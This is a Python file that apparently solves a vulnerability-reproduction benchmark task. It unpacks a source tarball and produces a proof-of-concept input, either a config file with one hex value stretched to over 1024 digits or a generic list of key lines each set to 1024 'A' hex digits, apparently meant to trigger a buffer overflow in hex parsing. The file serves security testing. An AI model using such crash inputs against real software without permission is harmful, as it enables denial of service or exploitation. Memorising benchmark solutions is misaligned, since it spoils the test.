import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        base_dir = self._extract_tar(src_path)
        sample_content = self._find_sample_config(base_dir)
        if sample_content is not None:
            poc = self._build_from_sample_config(sample_content)
            if poc is not None:
                return poc
        candidate_keys = self._find_candidate_keys(base_dir, max_keys=5)
        poc = self._build_generic_poc(candidate_keys)
        return poc

    def _extract_tar(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    name = member.name
                    if not name:
                        continue
                    if os.path.isabs(name):
                        continue
                    parts = name.split("/")
                    if any(part == ".." for part in parts):
                        continue
                    try:
                        tf.extract(member, tmpdir)
                    except Exception:
                        continue
        except Exception:
            pass
        return tmpdir

    def _find_sample_config(self, base_dir: str):
        best_content = None
        best_score = -1.0
        hex_pattern0 = re.compile(r'0x[0-9a-fA-F]+')
        hex_plain = re.compile(r'\b[0-9a-fA-F]{8,}\b')
        for root, _, files in os.walk(base_dir):
            for fname in files:
                low = fname.lower()
                if not (
                    any(
                        low.endswith(ext)
                        for ext in (
                            ".conf",
                            ".cfg",
                            ".ini",
                            ".config",
                            ".txt",
                            ".cfg.in",
                            ".yaml",
                            ".yml",
                            ".json",
                            ".toml",
                            ".ini.in",
                            ".sample",
                        )
                    )
                    or "conf" in low
                    or "config" in low
                ):
                    continue
                path = os.path.join(root, fname)
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = data.decode("latin1", "ignore")
                except Exception:
                    continue
                m0 = hex_pattern0.findall(text)
                m1 = hex_plain.findall(text)
                score = len(m0) + len(m1)
                if score <= 0:
                    continue
                size = len(text)
                score_metric = score * 10.0 - size / 100000.0
                if score_metric > best_score:
                    best_score = score_metric
                    best_content = text
        return best_content

    def _build_from_sample_config(self, text: str):
        lines = text.splitlines(keepends=True)
        hex_pattern0 = re.compile(r'0x[0-9a-fA-F]+')
        hex_plain = re.compile(r'\b[0-9a-fA-F]{8,}\b')
        for idx, line in enumerate(lines):
            m = hex_pattern0.search(line)
            if not m:
                m = hex_plain.search(line)
            if not m:
                continue
            orig = m.group(0)
            if orig.startswith(("0x", "0X")):
                prefix = orig[:2]
                digits = orig[2:]
            else:
                prefix = ""
                digits = orig
            if not digits:
                continue
            target_len = max(1024, len(digits) * 16)
            if target_len % 2 != 0:
                target_len += 1
            repeat_count = target_len // len(digits) + 1
            rep = (digits * repeat_count)[:target_len]
            new_hex = prefix + rep
            new_line = line[: m.start()] + new_hex + line[m.end() :]
            lines[idx] = new_line
            content = "".join(lines)
            try:
                return content.encode("ascii", "ignore") or content.encode(
                    "utf-8", "ignore"
                )
            except Exception:
                return content.encode("utf-8", "ignore")
        return None

    def _find_candidate_keys(self, base_dir: str, max_keys: int = 5):
        keys = []
        seen = set()
        string_re = re.compile(r'"([^"]+)"')
        for root, _, files in os.walk(base_dir):
            for fname in files:
                if not fname.lower().endswith(
                    (".c", ".h", ".cpp", ".cc", ".hpp", ".cxx")
                ):
                    continue
                path = os.path.join(root, fname)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                for m in string_re.finditer(text):
                    s = m.group(1)
                    if not (1 <= len(s) <= 32):
                        continue
                    if not re.search(r"[A-Za-z]", s):
                        continue
                    if not re.fullmatch(r"[A-Za-z0-9_.-]+", s):
                        continue
                    lower = s.lower()
                    if any(
                        bad in lower
                        for bad in (
                            "usage",
                            "error",
                            "invalid",
                            "failed",
                            "fail",
                            "fatal",
                            "warning",
                            "unknown",
                            "options",
                            "option",
                            "help",
                            ".c",
                            "%s",
                            "%d",
                            "debug",
                            "info",
                            "trace",
                            "assert",
                            "not ",
                            "could ",
                            "should ",
                            "must ",
                            "unable",
                            "success",
                            "ok",
                        )
                    ):
                        continue
                    if s in seen:
                        continue
                    seen.add(s)
                    keys.append(s)
                    if len(keys) >= max_keys:
                        return keys
        return keys

    def _build_generic_poc(self, candidate_keys):
        if not candidate_keys:
            candidate_keys = []
        defaults = ["hex", "data", "value", "color", "key", "payload", "buffer"]
        for d in defaults:
            if d not in candidate_keys:
                candidate_keys.append(d)
        candidate_keys = candidate_keys[:5]
        hex_len = 1024
        if hex_len % 2 != 0:
            hex_len += 1
        hex_digits = "A" * hex_len
        lines = []
        for key in candidate_keys:
            lines.append(f"{key} = 0x{hex_digits}\n")
            lines.append(f"{key}=0x{hex_digits}\n")
            lines.append(f"{key} 0x{hex_digits}\n")
            lines.append(f"{key}: 0x{hex_digits}\n")
            lines.append(f'"{key}" = "0x{hex_digits}"\n')
            lines.append(f'"{key}": "0x{hex_digits}"\n')
        lines.append(f"0x{hex_digits}\n")
        lines.append(f"{hex_digits}\n")
        content = "".join(lines)
        return content.encode("ascii", "ignore")
